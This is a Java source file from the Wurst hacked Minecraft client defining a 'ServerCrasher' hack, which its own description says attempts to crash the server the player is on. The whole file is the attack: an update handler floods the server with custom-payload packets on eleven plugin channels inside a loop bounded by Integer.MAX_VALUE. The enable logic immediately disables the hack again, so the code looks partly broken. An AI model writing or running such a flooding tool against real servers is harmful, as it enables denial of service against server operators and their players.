/*
 * Copyright (C) 2017 - 2019 | Wurst-Imperium | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.forge.hacks.world;

import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.wurstclient.fmlevents.WUpdateEvent;
import net.wurstclient.forge.Category;
import net.wurstclient.forge.Hack;

public final class ServerCrasher extends Hack {

	public ServerCrasher() {
		super("ServerCrasher", "Attempts to crash the server your on.");
		setCategory(Category.WORLD);
	}

	String[] strings = new String[]{"MC|AdvCdm", "MC|Beacon", "MC|BEdit", "MC|BSign", "MC|BOpen", "MC|ItemName", "MC|RPack", "MC|TrList", "MC|TrSel", "MC|PingHost", "MC|Brand"};

	private PacketBuffer packetBuffer;
	@Override
	protected void onEnable() {
		MinecraftForge.EVENT_BUS.register(this);
		packetBuffer = new PacketBuffer(Unpooled.buffer());
		byte[] rawPayload = new byte[(int) Math.round(Math.random() * 128)];
		packetBuffer.writeBytes(rawPayload);

		setEnabled(false);
	}

	@Override
	protected void onDisable(){
		MinecraftForge.EVENT_BUS.unregister(this);
	}

	@SubscribeEvent
	public void onUpdate(WUpdateEvent event) {
		for (int i = 0; i < Integer.MAX_VALUE; i ++) {
			for (String string : strings) {
				mc.player.connection.sendPacket(new CPacketCustomPayload(string, packetBuffer));
			}
		}
	}
}